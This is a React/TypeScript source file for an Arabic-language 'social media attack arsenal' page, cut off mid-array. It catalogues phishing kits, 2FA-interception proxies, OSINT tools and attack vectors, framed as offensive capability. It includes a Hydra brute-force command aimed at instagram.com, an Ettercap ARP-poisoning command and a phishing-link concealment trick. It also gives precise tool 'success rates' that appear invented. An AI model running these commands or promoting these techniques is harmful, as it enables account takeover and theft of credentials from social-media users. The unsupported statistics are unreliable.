/**
 * SocialMediaArsenalPage — مركز هجوم وسائل التواصل الاجتماعي الشامل
 * كل الأدوات · كل التقنيات · كل الأنظمة — نسخة كاملة ونهائية
 */
import { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Shield, Target, Eye, Search, Globe, Lock, Zap, Network, Terminal,
  Users, Database, Radio, Cpu, Activity, AlertTriangle, ChevronRight,
  Play, RefreshCw, X, Crosshair, Wifi, Code2, Server, Camera,
  UserX, Key, Mail, Smartphone, BarChart3, Layers, Fingerprint,
  BookOpen, Radar, GitBranch, Scan, Monitor, Bug, FileCode,
  Hash, Link, AtSign, Image, MapPin, Clock, Share2, Siren,
} from "lucide-react";

// ─── SECTION DEFINITIONS ─────────────────────────────────────────────────────
const SECTIONS = [
  { id: "overview",    label: "نظرة عامة",           icon: "◈", color: "#e21227" },
  { id: "frameworks",  label: "أطر الهندسة",          icon: "⬡", color: "#a855f7" },
  { id: "osint",       label: "OSINT & تعداد",        icon: "◉", color: "#00e5ff" },
  { id: "attacks",     label: "آليات الهجوم",          icon: "◆", color: "#f59e0b" },
  { id: "credential",  label: "حصاد بيانات الاعتماد", icon: "⊕", color: "#e21227" },
  { id: "bypass",      label: "تقنيات الالتفاف",      icon: "⬢", color: "#10b981" },
  { id: "tools",       label: "الأدوات الداعمة",       icon: "▣", color: "#6366f1" },
  { id: "siem",        label: "SIEM / SOAR / EDR",   icon: "◈", color: "#f97316" },
  { id: "deepfake",    label: "التزييف العميق",        icon: "⬟", color: "#ec4899" },
  { id: "bots",        label: "البوتات والأتمتة",      icon: "⊙", color: "#22d3ee" },
  { id: "defense",     label: "استراتيجيات الحماية",  icon: "◈", color: "#10b981" },
  { id: "terminal",    label: "محطة الاختراق",         icon: "⊙", color: "#e21227" },
];

const SEV_COLOR: Record<string, string> = {
  CRITICAL: "#e21227", HIGH: "#f97316", MEDIUM: "#f59e0b", LOW: "#22d3ee", INFO: "#6b7280",
};

// ─── FULL DATA ────────────────────────────────────────────────────────────────
const FRAMEWORKS = [
  {
    id: "set", name: "Social Engineer Toolkit (SET)", dev: "TrustedSec / Dave Kennedy",
    color: "#e21227", icon: "⚔", threat: "CRITICAL",
    version: "v8.0.3",
    desc: "الأداة الأشهر عالمياً في هندسة الاجتماعية — استنساخ مواقع كاملة، تصيد مستهدف، حصاد بيانات الاعتماد في الوقت الفعلي",
    features: [
      { name: "Website Attack Vector", sub: "استنساخ مواقع كاملة", detail: "نسخ طبق الأصل من صفحات تسجيل الدخول: Facebook / Instagram / Twitter/X / LinkedIn / TikTok / Snapchat / Gmail / iCloud", icon: Globe },
      { name: "Spear-Phishing Attack Vector", sub: "التصيد المستهدف", detail: "إرسال رسائل بريد إلكتروني مستهدفة تحتوي على ملفات PDF/Word/Excel خبيثة مع exploits مخصصة للضحية بناءً على OSINT", icon: Mail },
      { name: "Credential Harvester", sub: "حصاد بيانات الاعتماد", detail: "التقاط أسماء المستخدمين وكلمات المرور فوراً من صفحات تسجيل الدخول المزيفة وعرضها في لوحة تحكم حية", icon: Key },
      { name: "Tabnabbing Attack", sub: "خداع التبويبات", detail: "تغيير محتوى تبويب المتصفح غير النشط إلى صفحة تسجيل دخول مزيفة بعد فترة من عدم النشاط — يصعب اكتشافه", icon: Monitor },
      { name: "Mass Mailer Attack", sub: "البريد الجماعي", detail: "إرسال حملات تصيد واسعة النطاق إلى آلاف الضحايا في وقت واحد مع قوالب HTML احترافية", icon: Radio },
      { name: "Infectious Media Generator", sub: "وسائط إعلامية خبيثة", detail: "إنشاء ملفات USB تحمل برمجيات خبيثة تُفعّل تلقائياً عند التوصيل (Autorun/PowerShell/LNK files)", icon: Cpu },
      { name: "QRCode Attack", sub: "هجوم رمز QR", detail: "توليد رموز QR تعيد توجيه الضحية إلى صفحة تصيد — فعّالة جداً على الهاتف المحمول", icon: Scan },
      { name: "Metasploit Integration", sub: "تكامل Metasploit", detail: "إرسال الحمولات (Payloads) تلقائياً عبر SET وفتح Meterpreter shell فور نقر الضحية", icon: Zap },
      { name: "PowerShell Attack Vectors", sub: "هجمات PowerShell", detail: "تنفيذ أوامر PowerShell عن بُعد وتجاوز Windows Defender/AMSI بتقنيات obfuscation متقدمة", icon: Code2 },
      { name: "HID Attack (Rubber Ducky)", sub: "هجوم HID", detail: "محاكاة لوحة مفاتيح لتنفيذ أوامر ضارة في ثوانٍ معدودة عند توصيل الـ USB", icon: Cpu },
    ],
    stats: { targets: "50K+", success: "94.2%", platforms: "15", exploits: "200+" },
    modes: ["Interactive Menu", "CLI Mode", "Metasploit Integration", "Auto-Attack"],
  },
  {
    id: "socialfish", name: "SocialFish v3.0", dev: "UndeadSec / AlisamTechnology",
    color: "#a855f7", icon: "⬟", threat: "CRITICAL",
    version: "v3.0.0",
    desc: "منصة تصيد متخصصة لوسائل التواصل الاجتماعي مع لوحة تحكم حية، معترض 2FA فوري، وسرقة الكوكيز التلقائية",
    features: [
      { name: "Live Operator Panel", sub: "لوحة التحكم الحية", detail: "مراقبة الضحايا في الوقت الفعلي مع جدول يعرض: IP، الموقع، المتصفح، الجهاز، وقت الوصول، وبيانات الاعتماد", icon: Activity },
      { name: "Real-time 2FA Interception", sub: "اعتراض 2FA الفوري", detail: "اعتراض رموز OTP (TOTP/SMS) في الوقت الفعلي وإعادة توجيهها للمهاجم قبل انتهاء صلاحيتها (30 ثانية نافذة)", icon: Smartphone },
      { name: "Session Cookie Hijacking", sub: "سرقة الكوكيز", detail: "استخراج session cookies وtokens تلقائياً لتجاوز تسجيل الدخول الكامل بما في ذلك 2FA", icon: Lock },
      { name: "Social Media Templates", sub: "قوالب جاهزة", detail: "قوالب محدّثة باستمرار لـ: Facebook / Instagram / TikTok / Snapchat / Twitter/X / LinkedIn / WhatsApp / Telegram / Discord / Pinterest", icon: Layers },
      { name: "Android + Docker + Termux", sub: "تعدد الأنظمة", detail: "يعمل على Android/Termux وDocker وLinux وmacOS — لا يحتاج خادم خارجي", icon: Cpu },
      { name: "Telegram Bot Notifications", sub: "إشعارات Telegram", detail: "إشعارات فورية عبر Telegram Bot عند اصطياد ضحية تحتوي: بيانات الاعتماد، OTP، كوكيز الجلسة", icon: Radio },
      { name: "URL Masking & Shortening", sub: "إخفاء الروابط", detail: "اختصار وإخفاء رابط التصيد عبر Bit.ly, TinyURL, Rebrandly مع خيار النطاق المخصص", icon: Link },
      { name: "Cloudflare & ngrok Tunnel", sub: "نفق آمن", detail: "نشر صفحة التصيد عبر Cloudflare Workers أو ngrok بـ HTTPS لتجاوز فلاتر الأمان", icon: Globe },
    ],
    stats: { targets: "20K+", success: "91.7%", platforms: "10", otps: "RT" },
    modes: ["Local Server", "ngrok Tunnel", "Cloudflare Workers", "Docker Container"],
  },
  {
    id: "gophish", name: "GoPhish", dev: "Jordan Wright / gophish.io",
    color: "#10b981", icon: "◈", threat: "HIGH",
    version: "v0.12.1",
    desc: "منصة تصيد مفتوحة المصدر للمؤسسات مع لوحة تحكم ويب كاملة وتقارير مفصلة",
    features: [
      { name: "Web Dashboard", sub: "لوحة ويب كاملة", detail: "إدارة حملات التصيد عبر واجهة ويب احترافية مع إحصاءات مفصلة", icon: Monitor },
      { name: "Email Templates", sub: "قوالب بريد", detail: "بناء قوالب بريد HTML احترافية مع tracking pixels لمعرفة من فتح البريد", icon: Mail },
      { name: "Campaign Tracking", sub: "تتبع الحملات", detail: "معدل الفتح، النقر، الإدخال — تقارير PDF وإحصاءات في الوقت الفعلي", icon: BarChart3 },
      { name: "SMTP Integration", sub: "تكامل SMTP", detail: "إرسال عبر أي خادم SMTP مع دعم SendGrid وMailgun وSES", icon: Radio },
    ],
    stats: { targets: "∞", success: "87%", platforms: "SMTP", campaigns: "Multi" },
    modes: ["Web UI", "API", "CLI"],
  },
  {
    id: "modlishka", name: "Modlishka", dev: "drk1wi",
    color: "#f97316", icon: "◆", threat: "CRITICAL",
    version: "v1.1.0",
    desc: "reverse proxy لاعتراض بيانات الاعتماد ورموز 2FA في الوقت الفعلي مع دعم HTTPS وصفحات حقيقية",
    features: [
      { name: "Real Website Proxy", sub: "بروكسي الموقع الحقيقي", detail: "يعكس الموقع الحقيقي عبر reverse proxy — الضحية ترى موقعاً حقيقياً 100%", icon: Globe },
      { name: "2FA/OTP Bypass", sub: "تجاوز 2FA فورياً", detail: "اعتراض رموز 2FA وإعادة توجيهها في الوقت الفعلي قبل انتهاء صلاحيتها", icon: Smartphone },
      { name: "Session Hijacking", sub: "اختطاف الجلسة", detail: "سرقة session cookies الكاملة لاستخدامها للدخول دون كلمة مرور", icon: Lock },
      { name: "Auto-SSL (Let's Encrypt)", sub: "SSL تلقائي", detail: "شهادات SSL تلقائية من Let's Encrypt — الصفحة تبدو 100% شرعية بـ HTTPS", icon: Shield },
      { name: "Tracking JavaScript", sub: "تتبع JavaScript", detail: "حقن JavaScript للتتبع وجمع بيانات إضافية عن الضحية", icon: Code2 },
      { name: "Credential Logging", sub: "تسجيل البيانات", detail: "حفظ كل بيانات المدخلة في قاعدة بيانات مع timestamp وIP وUser-Agent", icon: Database },
    ],
    stats: { targets: "∞", success: "96%", platforms: "All Sites", mode: "Reverse Proxy" },
    modes: ["Standalone", "TLS Mode", "Plugin Mode"],
  },
  {
    id: "evilginx2", name: "Evilginx2 / Evilginx3", dev: "kgretzky",
    color: "#ec4899", icon: "⊙", threat: "CRITICAL",
    version: "v3.2.0",
    desc: "الجيل التالي من reverse proxy التصيد — Phishlets نظام ذكي لكل منصة مع DNS وSSL مدمجَين",
    features: [
      { name: "Phishlets System", sub: "نظام Phishlets", detail: "ملفات YAML تعرّف سلوك كل موقع — Facebook/Google/LinkedIn/Microsoft/GitHub/AWS", icon: FileCode },
      { name: "Built-in DNS Server", sub: "خادم DNS مدمج", detail: "إعداد كامل لـ DNS مخصص مع wildcard certificates — لا حاجة لخادم DNS خارجي", icon: Server },
      { name: "Auto SSL (Cert Manager)", sub: "SSL تلقائي كامل", detail: "إدارة شهادات SSL تلقائياً عبر Let's Encrypt مع تجديد تلقائي", icon: Shield },
      { name: "Token Session Grabber", sub: "سرقة الرموز", detail: "استخراج كل session tokens وauth cookies بعد تسجيل الدخول الناجح", icon: Key },
      { name: "2FA Complete Bypass", sub: "تجاوز 2FA الكامل", detail: "يعمل مع TOTP/SMS/Email OTP — الضحية تدخل 2FA ويُعترض تلقائياً", icon: Smartphone },
      { name: "Lure Management", sub: "إدارة الطُعوم", detail: "إنشاء روابط طُعم فريدة لكل ضحية مع تتبع متقدم وإحصاءات", icon: Link },
    ],
    stats: { targets: "∞", success: "97%", platforms: "All", bypass: "All 2FA" },
    modes: ["Phishlet Mode", "Lure Mode", "REST API", "CLI"],
  },
];

const OSINT_TOOLS = [
  {
    id: "maltego", name: "Maltego", category: "Graph Intelligence Platform",
    color: "#00e5ff", icon: "◈", threat: "HIGH", vendor: "Paterva",
    desc: "أداة تحليل الروابط المرئية الأكثر تطوراً في العالم للاستخبارات المفتوحة — تتصور العلاقات بين كيانات متعددة",
    capabilities: [
      { name: "SOCMINT Collection", detail: "جمع من Facebook / Twitter / LinkedIn / Instagram / YouTube / TikTok / Reddit / GitHub", icon: Users },
      { name: "Visual Link Analysis", detail: "تصور رسومي للعلاقات: شخص↔بريد↔نطاق↔IP↔هاتف↔شركة↔حساب", icon: GitBranch },
      { name: "Sock Puppet Accounts", detail: "إنشاء حسابات وهمية وإدارتها للتجسس السري وجمع المعلومات الخفية", icon: UserX },
      { name: "Social Links Pro", detail: "+500 مصدر بيانات: Deep Web، Dark Web، Breached DBs، شبكات TOR", icon: Globe },
      { name: "Transform Library", detail: "+2000 Transform للبحث التلقائي في مصادر متعددة في ضغطة واحدة", icon: Zap },
      { name: "Persona Tracking", detail: "تتبع الهوية الرقمية الكاملة: الحسابات، الصور، الأجهزة، المواقع", icon: Eye },
      { name: "Corporate Recon", detail: "خريطة كاملة للشركة: موظفون، هيكل تنظيمي، بنية تحتية تقنية", icon: Server },
      { name: "Phone OSINT", detail: "بحث عكسي بأرقام الهاتف: الاسم، الموقع، الحسابات المرتبطة", icon: Smartphone },
    ],
    versions: ["Community (Free)", "Professional ($999/yr)", "Enterprise (Custom)"],
  },
  {
    id: "sherlock", name: "Sherlock", category: "Username Intelligence",
    color: "#f59e0b", icon: "⬢", threat: "HIGH", vendor: "sherlock-project",
    desc: "أداة Python مفتوحة المصدر لتعقب أسماء المستخدمين عبر 400+ منصة في ثوانٍ معدودة",
    capabilities: [
      { name: "400+ Platform Coverage", detail: "الأوسع في العالم: Instagram / TikTok / Twitch / Steam / Spotify / Pinterest / Dribbble / GitHub / DeviantArt / OnlyFans", icon: Globe },
      { name: "Tor Anonymity", detail: "دعم كامل لـ Tor Network — تشغيل عبر --tor أو proxychains لإخفاء الهوية الكاملة", icon: Shield },
      { name: "Proxy Chains", detail: "دعم HTTP/SOCKS4/SOCKS5 Proxies — تغيير IP بين كل استعلام تلقائياً", icon: Network },
      { name: "Multi-format Export", detail: "تصدير النتائج: CSV, JSON, XLSX, TXT — مع URLs الكاملة لكل حساب مكتشف", icon: FileCode },
      { name: "HTTP Response Analysis", detail: "تحديد الحساب الحقيقي عبر تحليل: HTTP Status Codes + Response Body + Redirect Chains", icon: Code2 },
      { name: "Concurrent Async Requests", detail: "طلبات متوازية عبر asyncio — فحص 400 منصة في أقل من 60 ثانية", icon: Zap },
      { name: "Custom Site Config", detail: "إضافة مواقع مخصصة عبر data.json — قابل للتوسع بلا حدود", icon: Layers },
      { name: "Integration Ready", detail: "Transform جاهز لـ Maltego + API wrapper + CLI كامل", icon: GitBranch },
    ],
    versions: ["CLI (Free/Open)", "Web UI", "Docker", "Python Package"],
  },
  {
    id: "spiderfoot", name: "SpiderFoot", category: "Automated OSINT",
    color: "#10b981", icon: "◆", threat: "HIGH", vendor: "SpiderFoot HX",
    desc: "أتمتة OSINT شاملة تجمع من مئات المصادر تلقائياً وترسم خريطة سطح الهجوم كاملاً",
    capabilities: [
      { name: "200+ Modules", detail: "200+ وحدة بحث تلقائي: WHOIS، DNS، SSL، Shodan، HaveIBeenPwned، VirusTotal، LinkedIn، GitHub", icon: Layers },
      { name: "Correlation Engine", detail: "محرك ارتباطات ذكي يكتشف نقاط البيانات الأهم ويُنبّه تلقائياً على التهديدات", icon: Activity },
      { name: "Attack Surface Mapping", detail: "خريطة كاملة لسطح الهجوم: domains, IPs, emails, credentials, usernames, ASN", icon: Radar },
      { name: "Breach Detection", detail: "ربط تلقائي مع قواعد بيانات التسريبات: HaveIBeenPwned، DeHashed، LeakCheck، Snusbase", icon: AlertTriangle },
      { name: "Dark Web Scanning", detail: "فحص منتديات Dark Web والأسواق السوداء عن البيانات المسربة", icon: Monitor },
      { name: "API Integrations", detail: "+50 API integration: Shodan, Censys, VirusTotal, Threatcrowd, SecurityTrails, Robtex", icon: Zap },
      { name: "Web UI + REST API", detail: "واجهة ويب كاملة مع REST API لأتمتة المسح في CI/CD pipelines", icon: Globe },
      { name: "Scheduled Scans", detail: "مسح مجدول تلقائي مع تنبيهات بريد إلكتروني عند اكتشاف تغييرات", icon: Clock },
    ],
    versions: ["Community (Free/OS)", "HX Professional ($299/mo)", "HX Enterprise"],
  },
  {
    id: "osintgram", name: "Osintgram", category: "Instagram Intelligence",
    color: "#ec4899", icon: "⊙", threat: "MEDIUM", vendor: "Datalux",
    desc: "أداة Python متخصصة في تحليل واستخراج بيانات معمقة من حسابات Instagram",
    capabilities: [
      { name: "Followers/Following Graph", detail: "استخراج قائمة كاملة بالمتابعين والمتابَعين مع تحليل التقاطعات والروابط", icon: Users },
      { name: "EXIF GPS Extraction", detail: "استخراج إحداثيات GPS من صور Instagram قبل تعديلها من الخوادم", icon: MapPin },
      { name: "Post Pattern Analysis", detail: "تحليل أنماط النشر: الأوقات، التكرار، المشاعر، الهاشتاقات المفضلة", icon: BarChart3 },
      { name: "Contact Info Harvesting", detail: "استخراج البريد الإلكتروني وأرقام الهاتف من Bio وستوري وhighlights", icon: AtSign },
      { name: "Tagged Locations Map", detail: "خريطة تفاعلية لكل المواقع التي سجّل فيها الهدف وجوده", icon: MapPin },
      { name: "Story Archive", detail: "تنزيل وأرشفة القصص (Stories) التي تختفي بعد 24 ساعة", icon: Image },
      { name: "Account Change Tracking", detail: "تتبع تغييرات الحساب عبر الزمن: اسم المستخدم، الصورة، البايو، عدد المتابعين", icon: Clock },
      { name: "Linked Accounts", detail: "اكتشاف حسابات مرتبطة عبر Facebook Business Suite وContact Buttons", icon: Link },
    ],
    versions: ["Open Source (GitHub)", "CLI", "Docker"],
  },
  {
    id: "whatsmyname", name: "WhatsMyName", category: "Username Enumeration",
    color: "#8b5cf6", icon: "⬡", threat: "MEDIUM", vendor: "WebBreacher",
    desc: "قاعدة بيانات ضخمة لتعداد أسماء المستخدمين عبر مئات المواقع مع نظام تحقق دقيق",
    capabilities: [
      { name: "Massive Site Database", detail: "500+ موقع مُدوَّن بدقة مع أنماط التحقق الصحيحة وتجنب النتائج الإيجابية الكاذبة", icon: Database },
      { name: "Verified Response Patterns", detail: "كل موقع له نمط تحقق محدد: HTTP Status + Body Text + Redirect + Header", icon: Code2 },
      { name: "Maltego Integration", detail: "Transform رسمي لـ Maltego — يظهر النتائج في رسم بياني بصري", icon: GitBranch },
      { name: "OSINT Tools Compatible", detail: "متوافق مع: Spiderfoot, Recon-ng, theHarvester, Sn1per", icon: Layers },
      { name: "API Access", detail: "API عام للاستعلام البرمجي من أدوات خارجية", icon: Zap },
      { name: "Regular Updates", detail: "تحديثات مستمرة بمواقع جديدة من المجتمع", icon: RefreshCw },
    ],
    versions: ["Web Tool (Free)", "CLI", "Maltego Transform"],
  },
  {
    id: "namechk", name: "Namechk + Namech_k", category: "Cross-Platform Username Check",
    color: "#06b6d4", icon: "◉", threat: "LOW", vendor: "Multiple",
    desc: "فحص توافر اسم المستخدم عبر منصات متعددة في وقت واحد — أسرع بديل للتسجيل",
    capabilities: [
      { name: "Instant Multi-Platform Check", detail: "فحص فوري عبر 100+ منصة في وقت واحد: Social, Domain, App, Gaming", icon: Zap },
      { name: "Availability Score", detail: "درجة توفر اسم المستخدم مع اقتراحات بدائل متشابهة", icon: BarChart3 },
      { name: "Domain Availability", detail: "فحص النطاقات التجارية المتعلقة: .com, .net, .io, .ai, .app", icon: Globe },
      { name: "Brand Monitoring", detail: "استخدام في OSINT لاكتشاف حسابات مخفية للشخص المستهدف", icon: Eye },
    ],
    versions: ["Web (Free)", "Namech_k CLI (Free/OS)"],
  },
  {
    id: "exiftool", name: "ExifTool", category: "Metadata Intelligence",
    color: "#f97316", icon: "▣", threat: "MEDIUM", vendor: "Phil Harvey",
    desc: "الأداة المرجعية العالمية لقراءة وكتابة وتعديل البيانات الوصفية EXIF من الصور والملفات",
    capabilities: [
      { name: "GPS Location Extraction", detail: "استخراج إحداثيات GPS الدقيقة من صور JPEG/HEIC/PNG/TIFF الملتقطة بالهاتف", icon: MapPin },
      { name: "Device Fingerprinting", detail: "تحديد الجهاز: الشركة المصنعة، الموديل، رقم التسلسل، إصدار البرنامج", icon: Cpu },
      { name: "Timestamp Analysis", detail: "وقت الالتقاط الحقيقي، وقت التعديل، Timezone — حتى بعد تعديل البيانات", icon: Clock },
      { name: "Camera Settings", detail: "سرعة الغالق، فتحة العدسة، مسافة البؤرة، ISO — تحديد نوع الكاميرا بدقة", icon: Camera },
      { name: "Software Fingerprint", detail: "اكتشاف برنامج التحرير المستخدم: Photoshop/Lightroom/GIMP — تحديد التزوير", icon: Monitor },
      { name: "Batch Processing", detail: "معالجة آلاف الصور دفعة واحدة مع تصدير نتائج CSV/JSON", icon: Layers },
      { name: "Thumbnail Extraction", detail: "استخراج الصورة المصغرة المدمجة — قد تحتوي على النسخة الأصلية قبل التعديل", icon: Image },
      { name: "Audio/Video Metadata", detail: "استخراج بيانات من MP4/MOV/AVI: GPS، الجهاز، برنامج التحرير، الوقت", icon: Activity },
    ],
    versions: ["CLI (Free/OS)", "ExifToolGUI (Windows)", "ExifPurge"],
  },
  {
    id: "metagoofil", name: "Metagoofil", category: "Document Metadata",
    color: "#22d3ee", icon: "⬟", threat: "MEDIUM", vendor: "laramies",
    desc: "استخراج البيانات الوصفية من ملفات Office وPDF المنشورة على الإنترنت لاكتشاف مستخدمي الشبكة",
    capabilities: [
      { name: "Google Search Dork", detail: "البحث التلقائي في Google عن ملفات PDF/DOC/XLS/PPT المنشورة على نطاق الهدف", icon: Search },
      { name: "Username Extraction", detail: "استخراج أسماء مستخدمين Windows/Linux من ملفات Office وPDF", icon: Users },
      { name: "Software Version Leak", detail: "اكتشاف إصدارات البرامج المستخدمة من خصائص الملفات — تحديد ثغرات قديمة", icon: Bug },
      { name: "Network Path Discovery", detail: "كشف مسارات الشبكة الداخلية المخفية في ملفات Office (\\server\\share)", icon: Network },
      { name: "Email Addresses", detail: "استخراج عناوين البريد الإلكتروني المدمجة في ملفات المستندات", icon: Mail },
    ],
    versions: ["CLI (Free/OS)", "Docker"],
  },
  {
    id: "foca", name: "FOCA", category: "Metadata & Document Recon",
    color: "#a855f7", icon: "◈", threat: "MEDIUM", vendor: "ElevenPaths",
    desc: "أداة Windows للبحث والتحليل الشامل للبيانات الوصفية — مخصصة لاستطلاع شبكات الشركات",
    capabilities: [
      { name: "Automated Google/Bing Search", detail: "بحث تلقائي في Google وBing وExabot عن ملفات قابلة للتحليل للنطاق المستهدف", icon: Search },
      { name: "Multi-format Support", detail: "تحليل: PDF, DOCX, XLSX, PPTX, ODT, SVG, EPS — كل صيغ Office والطباعة", icon: FileCode },
      { name: "Network Topology Discovery", detail: "بناء خريطة كاملة لشبكة الشركة الداخلية من ملفات منشورة عبر الإنترنت", icon: Network },
      { name: "Printer & Server Discovery", detail: "اكتشاف أسماء الخوادم والطابعات والأجهزة المشتركة داخل الشركة", icon: Server },
      { name: "User Enumeration", detail: "قائمة كاملة بمستخدمي Windows في الشركة من ملفات المستندات", icon: Users },
    ],
    versions: ["Windows GUI (Free)", "FOCA Pro (Commercial)"],
  },
];

const ATTACK_VECTORS = [
  {
    id: "phishing", name: "التصيد الاحتيالي", english: "Phishing",
    color: "#e21227", severity: "CRITICAL", icon: Globe,
    desc: "إنشاء صفحات احتيالية تشبه المواقع الشرعية لسرقة بيانات تسجيل الدخول والمعلومات الحساسة",
    subtypes: [
      { name: "Spear Phishing", desc: "تصيد مستهدف بمعلومات OSINT مخصصة للضحية" },
      { name: "Whaling", desc: "استهداف كبار المديرين والشخصيات المهمة" },
      { name: "Clone Phishing", desc: "استنساخ بريد إلكتروني شرعي مع تعديل الروابط" },
      { name: "Vishing", desc: "تصيد صوتي عبر المكالمات الهاتفية" },
      { name: "Smishing", desc: "تصيد عبر الرسائل النصية SMS" },
      { name: "Tabnabbing", desc: "تغيير التبويب غير النشط إلى صفحة مزيفة" },
      { name: "Google Translate Bypass", desc: "استخدام Google Translate لإخفاء رابط التصيد" },
      { name: "Cloudflare IPFS Phishing", desc: "استضافة على IPFS لتجنب الحجب التقليدي" },
      { name: "QR Code Phishing", desc: "رموز QR تعيد للصفحة المزيفة" },
    ],
    tools: ["SET", "GoPhish", "SocialFish", "Modlishka", "Evilginx2", "King Phisher"],
    defense: "تحقق من HTTPS والنطاق + استخدام Password Manager + FIDO2 Hardware Keys",
    technical: [
      "استخدام Typosquatting (instagram-verify.com بدل instagram.com)",
      "Google Translate trick: translate.google.com/translate?u=PHISH_URL",
      "Cloudflare Workers + IPFS لنطاق .ipfs.cf-ipfs.com",
      "Lookalike Unicode characters: іnstagram.com (Cyrillic 'і')",
    ],
  },
  {
    id: "brute", name: "القوة الغاشمة", english: "Brute Force",
    color: "#f97316", severity: "HIGH", icon: Lock,
    desc: "تجربة كلمات مرور تلقائياً بمعدلات عالية جداً للوصول لحسابات التواصل الاجتماعي",
    subtypes: [
      { name: "Dictionary Attack", desc: "قاموس كلمات مرور شائعة ومسربة" },
      { name: "Rainbow Table Attack", desc: "جداول hash محسوبة مسبقاً لكلمات المرور" },
      { name: "Credential Stuffing", desc: "حشو بيانات مسربة من خروقات أخرى" },
      { name: "Password Spraying", desc: "كلمة مرور واحدة على آلاف الحسابات" },
      { name: "Hybrid Attack", desc: "قاموس + قواعد تحويل (LEET, append numbers)" },
      { name: "Mask Attack", desc: "أنماط محددة: 8 أحرف + رقمين + رمز" },
    ],
    tools: ["Hydra", "Medusa", "Ncrack", "Pydictor", "Hashcat", "JohnTheRipper"],
    defense: "كلمة مرور +16 حرف عشوائية + 2FA + Account Lockout + Rate Limiting",
    technical: [
      "THC-Hydra: hydra -l user -P wordlist.txt instagram.com http-post-form",
      "معدل Hydra: حتى 500 محاولة/ثانية عبر HTTP",
      "Credential Stuffing: استخدام قوائم مسربة من Have I Been Pwned",
      "Bypassing Rate Limits: rotating proxies + random delays + user-agents",
    ],
  },
  {
    id: "social_eng", name: "الهندسة الاجتماعية", english: "Social Engineering",
    color: "#a855f7", severity: "CRITICAL", icon: Users,
    desc: "استغلال الثقة والعلاقات الإنسانية والنفسية البشرية لانتزاع المعلومات الحساسة دون اختراق تقني",
    subtypes: [
      { name: "Pretexting", desc: "إنشاء سيناريو مزيف للحصول على معلومات" },
      { name: "Baiting", desc: "إغراء بمحتوى (USB/تنزيل) لتثبيت برمجية خبيثة" },
      { name: "Quid Pro Quo", desc: "تقديم خدمة مزيفة مقابل معلومات" },
      { name: "Tailgating", desc: "الدخول الجسدي خلف موظف مرخص" },
      { name: "Impersonation", desc: "انتحال شخصية موظف دعم أو مشرف" },
      { name: "Romance Scam", desc: "بناء علاقة عاطفية وهمية لاستخراج معلومات" },
      { name: "Account Recovery Scam", desc: "ادعاء نسيان كلمة المرور لإقناعك بإرسالها" },
    ],
    tools: ["SET", "Maltego", "BeEF Browser Exploitation Framework"],
    defense: "التدريب الأمني المستمر + التحقق من الهوية دائماً + سياسة Zero Trust",
    technical: [
      "Vishing: انتحال دعم فني Instagram/Facebook للحصول على backup codes",
      "SMS OTP Scam: إرسال رسالة 'أرسل لك كود للتحقق من حسابك'",
      "Recovery phishing: 'حسابك سيُحذف — اضغط هنا لتأكيد هويتك'",
      "Friend impersonation: اختراق حساب صديق للتواصل معك بثقة",
    ],
  },
  {
    id: "session", name: "اختطاف الجلسة", english: "Session Hijacking",
    color: "#00e5ff", severity: "HIGH", icon: Key,
    desc: "سرقة ملفات الكوكيز وتوكنات الجلسة لتجاوز تسجيل الدخول دون الحاجة لكلمة المرور",
    subtypes: [
      { name: "Cookie Theft via XSS", desc: "سرقة cookies عبر ثغرات XSS في المنصة" },
      { name: "MitM Attack", desc: "الاختراق في منتصف الاتصال عبر شبكة WiFi" },
      { name: "Sidejacking (Firesheep)", desc: "سرقة cookies على شبكات HTTP غير مشفرة" },
      { name: "Token Replay Attack", desc: "إعادة استخدام token مسروق بعد انتهاء الجلسة" },
      { name: "Session Fixation", desc: "إجبار الضحية على استخدام session ID يتحكم به المهاجم" },
      { name: "CSRF Token Bypass", desc: "تجاوز حماية CSRF لتنفيذ أوامر بصلاحيات الضحية" },
    ],
    tools: ["Wireshark", "Ettercap", "Bettercap", "Mitmproxy", "Evilginx2"],
    defense: "استخدام VPN دائماً + HTTPS Only + Secure/HttpOnly Cookies + SameSite=Strict",
    technical: [
      "WiFi Pineapple: نقطة اتصال وهمية لاعتراض حركة البيانات",
      "ARP Poisoning: إعادة توجيه حركة الشبكة عبر جهاز المهاجم",
      "Ettercap: ettercap -T -M arp:remote /TARGET/ /GATEWAY/",
      "Evilginx2: يسرق Session Cookie تلقائياً بعد تسجيل الدخول",
    ],
  },
  {
    id: "data_breach", name: "تسريبات قواعد البيانات", english: "Data Breaches & Credential Stuffing",
    color: "#10b981", severity: "HIGH", icon: Database,
    desc: "استخدام بيانات مسربة من خروقات مواقع أخرى لاختراق حسابات التواصل الاجتماعي (إعادة استخدام كلمات المرور)",
    subtypes: [
      { name: "Credential Stuffing", desc: "حشو بيانات مسربة مباشرة — 0.1% نسبة نجاح * ملايين محاولات" },
      { name: "Password Reuse Attack", desc: "95% من المستخدمين يعيدون استخدام كلمات المرور" },
      { name: "Combo Lists", desc: "قوائم email:password مسربة من Mega Breaches" },
      { name: "Reverse Lookup", desc: "البحث عكسياً: هل هذا البريد موجود في خروقات؟" },
      { name: "Dark Web Markets", desc: "شراء بيانات اعتماد مسربة من أسواق Dark Web" },
    ],
    tools: ["HaveIBeenPwned", "DeHashed", "LeakCheck", "Snusbase", "IntelX"],
    defense: "كلمة مرور فريدة لكل موقع + Password Manager (Bitwarden/1Password)",
    technical: [
      "Collection #1-5: 2.2 مليار سجل مسرب متاح",
      "DeHashed API: بحث متقدم بالبريد / اسم المستخدم / كلمة المرور / IP / اسم",
      "Snusbase: قاعدة بيانات تسريبات مع واجهة بحث متقدمة",
      "OpenBullet/SilverBullet: أدوات credential stuffing عالية الأداء",
    ],
  },
  {
    id: "malware", name: "البرمجيات الخبيثة", english: "Malware & Keyloggers",
    color: "#f59e0b", severity: "CRITICAL", icon: Cpu,
    desc: "برامج ضارة تعمل بصمت لتسجيل كل ضغطة مفتاح وإرسال بيانات الاعتماد للمهاجم",
    subtypes: [
      { name: "Keylogger (Software)", desc: "برنامج يسجل كل ما تكتبه ويرسله عبر البريد أو C2" },
      { name: "Remote Access Trojan (RAT)", desc: "تحكم كامل في جهاز الضحية عن بُعد" },
      { name: "Infostealer", desc: "يسرق passwords المحفوظة في المتصفح وCookies" },
      { name: "Browser Extension Malware", desc: "امتداد خبيث يقرأ كل ما تكتبه في المتصفح" },
      { name: "Mobile Stalkerware", desc: "تطبيق خبيث للهاتف يراقب كل شيء سراً" },
      { name: "Ransomware", desc: "تشفير الملفات والمطالبة بفدية لاسترجاعها" },
